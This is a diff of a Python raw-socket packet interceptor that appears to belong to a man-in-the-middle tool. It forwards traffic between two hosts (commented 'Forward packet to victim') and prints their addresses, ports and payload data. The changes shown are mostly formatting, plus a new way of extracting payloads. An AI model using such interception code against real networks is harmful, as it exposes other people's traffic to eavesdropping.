@@ -75,9 +75,9 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         ethernet_length = 14
         eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
         unpacked_eth = unpack('>6s6sH', eth_header)
-	#  unpacked_eth:
-	#-----------------
-	#  index:
+		#  unpacked_eth:
+		#-----------------
+		#  index:
         #   0 -  Destination MAC Address (48 bits)
         #   1 - Source MAC Address (48 bits)
         #   2 - EtherType (16 bits)
@@ -102,15 +102,15 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         srcIP = socket.inet_ntoa(unpacked_iph[8])
         dstIP = socket.inet_ntoa(unpacked_iph[9])
 
-	#Forward packet to victim
+		#Forward packet to victim
         new_dst_MAC = None
         if dstIP == Host_One_IP:
             new_dst_MAC = Host_One_MAC
         elif dstIP == Host_Two_IP:
             new_dst_MAC = Host_Two_MAC
-
+		#Reconstruct packet with actual MAC
         if new_dst_MAC != None:
-            new_packet =[new_dst_MAC,packet[6:]]
+            new_packet = [new_dst_MAC,packet[6:]]
             s.send(b''.join(new_packet))
 
         ethAndIP_len = ethernet_length+ip_header_length
@@ -135,7 +135,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
         header_size = ethAndIP_len + tcp_header_length
 
-        data = packet[header_size:]
+        data = unpack('>' + str(len(packet)-header_size) + 's', packet[header_size:])
 
         if srcIP == Host_One_IP or srcIP == Host_Two_IP or dstIP == Host_One_IP or dstIP == Host_Two_IP:
             print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
